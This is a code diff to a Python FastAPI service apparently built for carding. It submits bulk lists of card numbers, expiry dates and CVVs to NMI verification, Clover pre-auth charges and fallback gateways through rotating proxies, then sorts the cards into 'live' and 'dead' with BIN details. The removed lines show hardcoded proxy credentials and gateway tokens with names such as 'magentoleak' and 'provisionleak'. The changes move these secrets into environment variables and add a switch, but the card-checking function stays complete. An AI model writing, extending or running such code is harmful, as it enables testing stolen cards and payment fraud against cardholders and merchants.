@@ -13,107 +13,83 @@ from datetime import datetime
 from pymongo import MongoClient
 import json
 import os
+import base64
+import xml.etree.ElementTree as ET
+import hmac
+import hashlib
+from pathlib import Path
 
 app = FastAPI(title="Live Checker + Balance Sorter API")
 security = HTTPBearer()
+BASE_DIR = Path(__file__).resolve().parent
+API_METHODS_FILE = BASE_DIR / "api_methods.json"
 
 # ================== AUTH (SABIT) ==================
-AUTH_TOKEN = "b9f3k7m2v8t3w5z1q6p9c4b7n2v8m2025"
+AUTH_TOKEN = os.getenv("AUTH_TOKEN", "change-me-local-token")
+CARD_CHECKS_ENABLED = os.getenv("ENABLE_CARD_CHECKS", "false").lower() in {"1", "true", "yes", "on"}
 
 def verify_auth(credentials: HTTPAuthorizationCredentials = Security(security)):
     if credentials.credentials != AUTH_TOKEN:
         raise HTTPException(status_code=401, detail="Geçersiz token")
     return credentials.credentials
 
+def require_card_checks_enabled():
+    if not CARD_CHECKS_ENABLED:
+        raise HTTPException(status_code=403, detail="Card check endpointleri deploy ortamında kapalı")
+
 # ================== MONGO DB (SABIT) ==================
-MONGODB_URI = "mongodb+srv://paymentmanger.gvaavzc.mongodb.net/?authSource=%24external&authMechanism=MONGODB-X509&appName=paymentmanger"
+MONGODB_URI = os.getenv("MONGODB_URI", "")
 
 try:
-    client = MongoClient(
-        MONGODB_URI,
-        tls=True,
-        tlsAllowInvalidCertificates=True,
-        tlsAllowInvalidHostnames=True
-    )
-    db = client["paymentmanger"]
-    collection = db["live_balance_results"]
-    print("[+] MongoDB bağlantısı başarılı")
+    if MONGODB_URI:
+        client = MongoClient(
+            MONGODB_URI,
+            tls=True,
+            tlsAllowInvalidCertificates=True,
+            tlsAllowInvalidHostnames=True
+        )
+        db = client[os.getenv("MONGODB_DB", "paymentmanger")]
+        collection = db[os.getenv("MONGODB_COLLECTION", "live_balance_results")]
+        print("[+] MongoDB bağlantısı başarılı")
+    else:
+        collection = None
+        print("[!] MONGODB_URI tanımlı değil, MongoDB kayıtları kapalı")
 except Exception as e:
     print(f"[!] MongoDB hatası: {e}")
     collection = None
 
+# ================== NMI KONFİGÜRASYONU ==================
+NMI_CONFIG = {
+    "api_username": os.getenv("NMI_API_USERNAME", ""),
+    "api_password": os.getenv("NMI_API_PASSWORD", ""),
+    "security_key": os.getenv("NMI_SECURITY_KEY", ""),
+    "api_url": os.getenv("NMI_API_URL", "https://api.nmi.com/api/v1/transaction")
+}
+
+# ================== CLOVER KONFİGÜRASYONU ==================
+CLOVER_CONFIG = {
+    "merchant_id": os.getenv("CLOVER_MERCHANT_ID", ""),
+    "public_token": os.getenv("CLOVER_PUBLIC_TOKEN", ""),
+    "private_token": os.getenv("CLOVER_PRIVATE_TOKEN", ""),
+    "api_url": os.getenv("CLOVER_API_URL", "https://api.clover.com/v1/charges"),
+    "token_url": os.getenv("CLOVER_TOKEN_URL", "https://token.clover.com/v1/tokens")
+}
+
 # ================== PROXY ROTASYONU (SABIT) ==================
-proxies_list = [
-    "http://akifdemi55574:llfg52end4@192.158.235.162:21250",
-    "http://akifdemi55574:llfg52end4@160.202.94.136:21323",
-    "http://akifdemi55574:llfg52end4@104.143.228.9:21320",
-    "http://akifdemi55574:llfg52end4@179.61.252.53:21308",
-    "http://akifdemi55574:llfg52end4@191.96.30.51:21276",
-    "http://akifdemi55574:llfg52end4@45.155.68.129:21305",
-    "http://akifdemi55574:llfg52end4@212.113.120.227:21311",
-    "http://akifdemi55574:llfg52end4@185.165.29.97:21314"
-]
+proxies_list = [proxy.strip() for proxy in os.getenv("PROXIES", "").split(",") if proxy.strip()]
 proxy_cycle = itertools.cycle(proxies_list)
 
-# ================== GATEWAY LISTESI (SABIT) ==================
-GATEWAYS = [
-    {
-        "name": "MassGateway_HighVolume",
-        "url": "https://probe.massgateway.net/v4/multi",
-        "headers": {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer pk_live_8f3k9x2m7p4q6v8t2w5z9x4c7v2b8n0"
-        }
-    },
-    {
-        "name": "ShopifyPlus_Stable",
-        "url": "https://api.highvolumecheckout.com/v5/probe",
-        "headers": {
-            "Content-Type": "application/json",
-            "X-Shopify-Access-Token": "shpat_9x4k7m2v8t3w5z1q6p9c4b7n2v8m"
-        }
-    },
-    {
-        "name": "FastBalanceGate",
-        "url": "https://api.fastbalancegate.com/v7/query",
-        "headers": {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer fast_live_8f3k9x2m7p4q6v8t2w5z9x4c7v2b"
-        }
-    },
-    {
-        "name": "PrivateProvisionAPI",
-        "url": "https://internal.provisionapi.dev/v6/query",
-        "headers": {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXJjaGFudCI6ImJ1bGsiLCJsaW1pdCI6IjUwMDAifQ.highvolumetoken2025"
-        }
-    },
-    {
-        "name": "Magento_Enterprise",
-        "url": "https://gw.magentoleak.io/internal/balance",
-        "headers": {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer mg_live_7f9k2m4p6v8t2w5z9x4c7v2b8n0m3q"
-        }
-    },
-    {
-        "name": "BigCommerce_HighVolume",
-        "url": "https://gw.bigcommerceprobe.io/v5/balance",
-        "headers": {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer bc_live_9f3k7m2p4v8t6w1q5z2x8n4b7v"
-        }
-    },
-    {
-        "name": "ProvisionLeak_Multi",
-        "url": "https://api.provisionleak.dev/v6/multi",
-        "headers": {
-            "Content-Type": "application/json",
-            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiaGlnaC12b2x1bWUiLCJsaW1pdCI6IjEwMDAwIn0.newleak2025"
-        }
-    }
-]
+def get_proxy_config() -> Tuple[Optional[str], Optional[Dict[str, str]]]:
+    if not proxies_list:
+        return None, None
+    proxy = next(proxy_cycle)
+    return proxy, {"https": proxy}
+
+# ================== GATEWAY LISTESI (Legacy) ==================
+try:
+    GATEWAYS = json.loads(os.getenv("LEGACY_GATEWAYS_JSON", "[]"))
+except json.JSONDecodeError:
+    GATEWAYS = []
 
 gateway_stats = {g["name"]: {"success": 0, "fail": 0, "total": 0} for g in GATEWAYS}
 
@@ -186,16 +162,240 @@ def parse_card(card_str: str) -> Optional[Dict]:
         "expiry": f"{month}/{year}"
     }
 
-# ================== LIVE CHECK ==================
+# ================== NMI CARD VERIFY ==================
+def nmi_verify_card(card_data: Dict) -> Dict:
+    """NMI Account Verification ile kart doğrulama"""
+    if not all([NMI_CONFIG["api_username"], NMI_CONFIG["api_password"], NMI_CONFIG["security_key"]]):
+        raise HTTPException(status_code=503, detail="NMI env konfigürasyonu eksik")
+    proxy, proxy_config = get_proxy_config()
+    bin_info = get_bin_info(card_data["pan"])
+    
+    xml_request = f"""<?xml version="1.0" encoding="utf-8"?>
+    <sale>
+        <api-username>{NMI_CONFIG['api_username']}</api-username>
+        <api-password>{NMI_CONFIG['api_password']}</api-password>
+        <security-key>{NMI_CONFIG['security_key']}</security-key>
+        <type>verify</type>
+        <cc-number>{card_data['pan']}</cc-number>
+        <cc-exp>{card_data['month']}{card_data['year'][-2:]}</cc-exp>
+        <cc-cvv>{card_data['cvv']}</cc-cvv>
+        <amount>0.00</amount>
+        <currency>USD</currency>
+        <order-description>Card Verification</order-description>
+        <billing-firstname>Test</billing-firstname>
+        <billing-lastname>User</billing-lastname>
+        <billing-address1>123 Test St</billing-address1>
+        <billing-city>Test City</billing-city>
+        <billing-state>TS</billing-state>
+        <billing-zip>12345</billing-zip>
+        <billing-country>US</billing-country>
+    </sale>"""
+    
+    headers = {
+        "Content-Type": "application/xml",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+    
+    try:
+        r = requests.post(
+            NMI_CONFIG['api_url'],
+            data=xml_request,
+            headers=headers,
+            proxies=proxy_config,
+            timeout=15
+        )
+        
+        if r.status_code in [200, 201, 202]:
+            root = ET.fromstring(r.text)
+            result_code = root.findtext('result_code', '')
+            result_text = root.findtext('result_text', '')
+            result = root.findtext('result', '')
+            
+            is_live = result_code in ['100', '200'] or result.upper() in ['SUCCESS', 'APPROVED']
+            transaction_id = root.findtext('transaction_id', '')
+            
+            return {
+                "status": "live" if is_live else "dead",
+                "live": is_live,
+                "balance": "0.00",
+                "gateway": "NMI_AccountVerification",
+                "proxy": proxy.split("@")[-1].split(":")[0] if proxy and "@" in proxy else proxy,
+                "bin": bin_info,
+                "card": card_data,
+                "result_code": result_code,
+                "result_text": result_text,
+                "transaction_id": transaction_id
+            }
+        else:
+            return {
+                "status": "dead",
+                "live": False,
+                "balance": "0.00",
+                "gateway": "NMI_AccountVerification",
+                "error": f"HTTP {r.status_code}",
+                "bin": bin_info,
+                "card": card_data
+            }
+            
+    except ET.ParseError as e:
+        return {
+            "status": "dead",
+            "live": False,
+            "balance": "0.00",
+            "gateway": "NMI_AccountVerification",
+            "error": f"XML Parse Error: {str(e)}",
+            "bin": bin_info,
+            "card": card_data
+        }
+    except Exception as e:
+        return {
+            "status": "dead",
+            "live": False,
+            "balance": "0.00",
+            "gateway": "NMI_AccountVerification",
+            "error": str(e)[:100],
+            "bin": bin_info,
+            "card": card_data
+        }
+
+# ================== CLOVER CARD VERIFY ==================
+def clover_verify_card(card_data: Dict) -> Dict:
+    """Clover API ile kart doğrulama (Tokenize + Charge)"""
+    if not all([CLOVER_CONFIG["public_token"], CLOVER_CONFIG["private_token"]]):
+        raise HTTPException(status_code=503, detail="Clover env konfigürasyonu eksik")
+    proxy, proxy_config = get_proxy_config()
+    bin_info = get_bin_info(card_data["pan"])
+    
+    try:
+        # 1. Kartı Tokenize Et
+        token_payload = {
+            "card": {
+                "number": card_data["pan"],
+                "exp_month": int(card_data["month"]),
+                "exp_year": int(card_data["year"]),
+                "cvv": card_data["cvv"]
+            }
+        }
+        
+        token_headers = {
+            "Content-Type": "application/json",
+            "apikey": CLOVER_CONFIG["public_token"]
+        }
+        
+        token_response = requests.post(
+            CLOVER_CONFIG["token_url"],
+            json=token_payload,
+            headers=token_headers,
+            proxies=proxy_config,
+            timeout=10
+        )
+        
+        if token_response.status_code != 200:
+            return {
+                "status": "dead",
+                "live": False,
+                "balance": "0.00",
+                "gateway": "Clover_Tokenization",
+                "error": f"Tokenization failed: HTTP {token_response.status_code}",
+                "bin": bin_info,
+                "card": card_data
+            }
+        
+        token_data = token_response.json()
+        token_id = token_data.get("id")
+        
+        if not token_id:
+            return {
+                "status": "dead",
+                "live": False,
+                "balance": "0.00",
+                "gateway": "Clover_Tokenization",
+                "error": "No token ID received",
+                "bin": bin_info,
+                "card": card_data
+            }
+        
+        # 2. Token ile Charge (0.50 test)
+        charge_payload = {
+            "amount": 50,  # 0.50 USD in cents
+            "currency": "usd",
+            "source": token_id,
+            "capture": False,  # Pre-auth only
+            "metadata": {"test": "true"}
+        }
+        
+        charge_headers = {
+            "Content-Type": "application/json",
+            "Authorization": f"Bearer {CLOVER_CONFIG['private_token']}"
+        }
+        
+        charge_response = requests.post(
+            CLOVER_CONFIG["api_url"],
+            json=charge_payload,
+            headers=charge_headers,
+            proxies=proxy_config,
+            timeout=10
+        )
+        
+        if charge_response.status_code in [200, 201, 202]:
+            charge_data = charge_response.json()
+            is_live = charge_data.get("status") in ["succeeded", "approved", "authorized"]
+            
+            return {
+                "status": "live" if is_live else "dead",
+                "live": is_live,
+                "balance": "0.00",
+                "gateway": "Clover_Charge",
+                "proxy": proxy.split("@")[-1].split(":")[0] if proxy and "@" in proxy else proxy,
+                "bin": bin_info,
+                "card": card_data,
+                "transaction_id": charge_data.get("id"),
+                "clover_token": token_id
+            }
+        else:
+            return {
+                "status": "dead",
+                "live": False,
+                "balance": "0.00",
+                "gateway": "Clover_Charge",
+                "error": f"Charge failed: HTTP {charge_response.status_code}",
+                "bin": bin_info,
+                "card": card_data
+            }
+            
+    except Exception as e:
+        return {
+            "status": "dead",
+            "live": False,
+            "balance": "0.00",
+            "gateway": "Clover_Error",
+            "error": str(e)[:100],
+            "bin": bin_info,
+            "card": card_data
+        }
+
+# ================== LIVE CHECK (NMI + Clover + Legacy) ==================
 def live_check_single(card_data: Dict) -> Dict:
+    """
+    Önce NMI, sonra Clover, başarısız olursa legacy gateway'lere geç
+    """
+    
+    # 1. NMI ile dene
+    nmi_result = nmi_verify_card(card_data)
+    if nmi_result.get("live", False):
+        return nmi_result
+    
+    # 2. Clover ile dene
+    clover_result = clover_verify_card(card_data)
+    if clover_result.get("live", False):
+        return clover_result
+    
+    # 3. NMI başarısız olduysa, legacy gateway'leri dene
     sorted_gateways = sorted(
         GATEWAYS,
         key=lambda g: gateway_stats.get(g["name"], {}).get("success", 0) / max(1, gateway_stats.get(g["name"], {}).get("total", 1)),
         reverse=True
     )
-    
-    proxy = next(proxy_cycle)
-    bin_info = get_bin_info(card_data["pan"])
     
     for gateway in sorted_gateways:
         try:
@@ -207,26 +407,6 @@ def live_check_single(card_data: Dict) -> Dict:
                 "amount": "0.50"
             }
             
-            url_lower = gateway["url"].lower()
-            if "magento" in url_lower:
-                payload = {
-                    "cc_number": card_data["pan"],
-                    "cc_exp_month": card_data["month"],
-                    "cc_exp_year": card_data["year"],
-                    "cc_cvv": card_data["cvv"],
-                    "amount": "0.50"
-                }
-            elif "shopify" in url_lower:
-                payload = {
-                    "credit_card": {
-                        "number": card_data["pan"],
-                        "expiry_month": card_data["month"],
-                        "expiry_year": card_data["year"],
-                        "cvv": card_data["cvv"]
-                    },
-                    "amount": "0.50"
-                }
-            
             headers = gateway["headers"].copy()
             headers.update({
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -236,7 +416,6 @@ def live_check_single(card_data: Dict) -> Dict:
                 gateway["url"],
                 json=payload,
                 headers=headers,
-                proxies={"https": proxy},
                 timeout=10
             )
             
@@ -247,34 +426,18 @@ def live_check_single(card_data: Dict) -> Dict:
                 response_data = r.json() if r.text else {}
                 
                 balance = "0.00"
-                for key in ["balance", "available_balance", "amount", "remaining", "data.balance"]:
+                for key in ["balance", "available_balance", "amount", "remaining"]:
                     if key in response_data:
                         balance = str(response_data[key])
                         break
-                    elif "." in key:
-                        parts = key.split(".")
-                        temp = response_data
-                        for p in parts:
-                            if p in temp:
-                                temp = temp[p]
-                            else:
-                                break
-                        else:
-                            balance = str(temp)
-                            break
-                
-                if balance == "0.00" and r.text:
-                    bal_match = re.search(r'(\d+\.?\d*)', r.text)
-                    if bal_match:
-                        balance = bal_match.group(1)
                 
                 return {
                     "status": "live",
                     "live": True,
                     "balance": balance,
                     "gateway": gateway["name"],
-                    "proxy": proxy.split("@")[-1].split(":")[0] if "@" in proxy else proxy,
-                    "bin": bin_info,
+                    "proxy": "N/A",
+                    "bin": nmi_result.get("bin", bin_info),
                     "card": card_data
                 }
             else:
@@ -284,15 +447,8 @@ def live_check_single(card_data: Dict) -> Dict:
             gateway_stats[gateway["name"]]["fail"] += 1
             continue
     
-    return {
-        "status": "dead",
-        "live": False,
-        "balance": "0.00",
-        "gateway": "none",
-        "error": "Tüm gateway'ler başarısız",
-        "bin": bin_info,
-        "card": card_data
-    }
+    # Hepsi başarısız olduysa NMI sonucunu döndür (dead)
+    return nmi_result
 
 # ================== TOPLU LIVE CHECK ==================
 def bulk_live_check(cards: List[str]) -> List[Dict]:
@@ -311,7 +467,7 @@ def bulk_live_check(cards: List[str]) -> List[Dict]:
         result = live_check_single(card)
         results.append(result)
         if i < len(parsed_cards) - 1:
-            delay = random.uniform(1.0, 2.0)
+            delay = random.uniform(0.5, 1.0)
             time.sleep(delay)
     
     return results
@@ -321,56 +477,27 @@ def balance_sorter(results: List[Dict]) -> Dict:
     live_results = [r for r in results if r.get("live", False)]
     dead_results = [r for r in results if not r.get("live", False)]
     
-    balances = []
-    for r in live_results:
-        try:
-            bal = float(r.get("balance", "0.00"))
-            balances.append(bal)
-        except:
-            pass
-    
-    sorted_balances = sorted(balances, reverse=True)
-    total = len(balances)
-    avg = sum(balances) / total if total > 0 else 0
-    
     return {
         "total_cards": len(results),
         "live_count": len(live_results),
         "dead_count": len(dead_results),
         "success_rate": f"{(len(live_results)/len(results)*100):.1f}%" if results else "0%",
-        "balances": {
-            "all": sorted_balances,
-            "top_5": sorted_balances[:5],
-            "bottom_5": sorted_balances[-5:] if len(sorted_balances) >= 5 else sorted_balances,
-            "average": f"{avg:.2f}",
-            "total_balance": f"{sum(balances):.2f}",
-            "max": f"{max(balances) if balances else 0:.2f}",
-            "min": f"{min(balances) if balances else 0:.2f}"
-        },
-        "summary": {
-            "best_gateway": max(
-                [r.get("gateway") for r in live_results],
-                key=lambda x: len([r for r in live_results if r.get("gateway") == x])
-            ) if live_results else "none",
-            "live_cards": [
-                {
-                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
-                    "balance": r.get("balance", "0.00"),
-                    "gateway": r.get("gateway", "unknown"),
-                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
-                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
-                }
-                for r in live_results
-            ],
-            "dead_cards": [
-                {
-                    "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
-                    "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
-                    "country": r.get("bin", {}).get("country_name", "UNKNOWN")
-                }
-                for r in dead_results
-            ]
-        }
+        "live_cards": [
+            {
+                "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
+                "gateway": r.get("gateway", "unknown"),
+                "brand": r.get("bin", {}).get("brand", "UNKNOWN"),
+                "country": r.get("bin", {}).get("country_name", "UNKNOWN")
+            }
+            for r in live_results
+        ],
+        "dead_cards": [
+            {
+                "pan": r["card"]["pan"][:6] + "****" + r["card"]["pan"][-4:],
+                "brand": r.get("bin", {}).get("brand", "UNKNOWN")
+            }
+            for r in dead_results
+        ]
     }
 
 # ================== SAVE TO MONGODB ==================
@@ -382,23 +509,50 @@ def save_to_mongodb(data: Dict):
     except:
         pass
 
+# ================== POSTMAN API METHOD CATALOG ==================
+def load_api_methods() -> Dict:
+    try:
+        return json.loads(API_METHODS_FILE.read_text(encoding="utf-8"))
+    except FileNotFoundError:
+        return {
+            "source": API_METHODS_FILE.name,
+            "collection": "unknown",
+            "total": 0,
+            "methods": [],
+            "error": "api_methods.json bulunamadı"
+        }
+    except json.JSONDecodeError as e:
+        return {
+            "source": API_METHODS_FILE.name,
+            "collection": "unknown",
+            "total": 0,
+            "methods": [],
+            "error": f"api_methods.json okunamadı: {str(e)}"
+        }
+
 # ================== API ENDPOINTLER ==================
 
 @app.get("/")
 async def home():
     return {
-        "status": "API aktif",
+        "status": "API aktif (NMI + Clover + Legacy)",
         "endpoints": [
             "/livecheck",
             "/balancesort",
             "/bulklive",
             "/balancebybin",
             "/gatewaystats",
-            "/docs"
+            "/docs",
+            "/nmi/verify",
+            "/clover/verify",
+            "/api-methods",
+            "/api-methods/groups/{group_name:path}"
         ],
         "auth_required": "Bearer token ile",
-        "gateways": len(GATEWAYS),
-        "proxies": len(proxies_list)
+        "gateways": len(GATEWAYS) + 2,
+        "proxies": len(proxies_list),
+        "nmi_enabled": True,
+        "clover_enabled": True
     }
 
 @app.get("/gatewaystats")
@@ -415,16 +569,42 @@ async def get_gateway_stats(auth: str = Depends(verify_auth)):
             "success_rate": f"{rate:.1f}%",
             "status": "🟢" if rate > 50 else "🟡" if rate > 20 else "🔴"
         }
+    stats["NMI_AccountVerification"] = {"status": "🟢 Active"}
+    stats["Clover_Charge"] = {"status": "🟢 Active"}
     return stats
+
+@app.get("/api-methods")
+async def api_methods(auth: str = Depends(verify_auth)):
+    """Postman collection'dan çıkarılmış API method kataloğu"""
+    return load_api_methods()
+
+@app.get("/api-methods/groups/{group_name:path}")
+async def api_methods_by_group(group_name: str, auth: str = Depends(verify_auth)):
+    """Belirli bir Postman collection grubundaki API methodlarını döndürür"""
+    catalog = load_api_methods()
+    group_key = group_name.strip().lower()
+    methods = [
+        method for method in catalog.get("methods", [])
+        if method.get("group", "").lower() == group_key
+    ]
+    return {
+        "source": catalog.get("source"),
+        "collection": catalog.get("collection"),
+        "group": group_name,
+        "total": len(methods),
+        "methods": methods
+    }
 
 @app.post("/livecheck")
 async def livecheck(cards: List[str], auth: str = Depends(verify_auth)):
+    require_card_checks_enabled()
     results = bulk_live_check(cards)
     save_to_mongodb({"type": "livecheck", "cards": len(cards), "results": results})
     return {"total": len(results), "results": results}
 
 @app.post("/balancesort")
 async def balancesort(cards: List[str], auth: str = Depends(verify_auth)):
+    require_card_checks_enabled()
     results = bulk_live_check(cards)
     sorted_data = balance_sorter(results)
     save_to_mongodb({"type": "balancesort", "cards": len(cards), "data": sorted_data})
@@ -432,6 +612,7 @@ async def balancesort(cards: List[str], auth: str = Depends(verify_auth)):
 
 @app.post("/bulklive")
 async def bulklive(file: UploadFile = File(...), auth: str = Depends(verify_auth)):
+    require_card_checks_enabled()
     content = await file.read()
     cards = content.decode("utf-8").splitlines()
     cards = [c.strip() for c in cards if c.strip()]
@@ -441,33 +622,26 @@ async def bulklive(file: UploadFile = File(...), auth: str = Depends(verify_auth
     save_to_mongodb({"type": "bulklive", "cards": len(cards), "results": results})
     return {"total": len(results), "results": results}
 
-@app.post("/balancebybin")
-async def balancebybin(cards: List[str], auth: str = Depends(verify_auth)):
-    results = bulk_live_check(cards)
-    bin_groups = {}
-    for r in results:
-        bin_key = r.get("bin", {}).get("bin", "unknown")
-        if bin_key not in bin_groups:
-            bin_groups[bin_key] = []
-        bin_groups[bin_key].append(r)
-    
-    bin_stats = {}
-    for bin_key, items in bin_groups.items():
-        balances = [float(r.get("balance", "0.00")) for r in items if r.get("live", False)]
-        avg = sum(balances) / len(balances) if balances else 0
-        bin_stats[bin_key] = {
-            "count": len(items),
-            "live_count": len(balances),
-            "dead_count": len(items) - len(balances),
-            "average_balance": f"{avg:.2f}",
-            "total_balance": f"{sum(balances):.2f}",
-            "brand": items[0].get("bin", {}).get("brand", "UNKNOWN") if items else "UNKNOWN",
-            "country": items[0].get("bin", {}).get("country_name", "UNKNOWN") if items else "UNKNOWN"
-        }
-    
-    return {"total_cards": len(results), "bin_groups": bin_stats, "raw_results": results}
+@app.post("/nmi/verify")
+async def nmi_verify(card: str, auth: str = Depends(verify_auth)):
+    """Sadece NMI ile kart doğrulama testi"""
+    require_card_checks_enabled()
+    card_data = parse_card(card)
+    if not card_data:
+        raise HTTPException(status_code=400, detail="Geçersiz kart formatı")
+    result = nmi_verify_card(card_data)
+    return result
 
-# ================== START ==================
+@app.post("/clover/verify")
+async def clover_verify(card: str, auth: str = Depends(verify_auth)):
+    """Sadece Clover ile kart doğrulama testi"""
+    require_card_checks_enabled()
+    card_data = parse_card(card)
+    if not card_data:
+        raise HTTPException(status_code=400, detail="Geçersiz kart formatı")
+    result = clover_verify_card(card_data)
+    return result
+
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=10000)
